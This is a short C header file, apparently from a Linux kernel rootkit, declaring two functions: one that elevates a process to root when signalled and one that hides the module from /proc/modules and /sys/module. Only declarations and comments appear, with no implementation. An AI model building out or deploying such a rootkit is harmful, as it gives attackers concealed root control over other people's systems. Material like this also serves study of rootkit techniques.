#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include <linux/types.h>


/**
 * Elevate the current process to root
 *
 * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGNAL_ROOT)
 * @param i32_sig The signal that was passed (currently unused)
 */
void give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Hide the rootkit from /proc/modules and /sys/module/
 */
void hide_module(void);

#endif
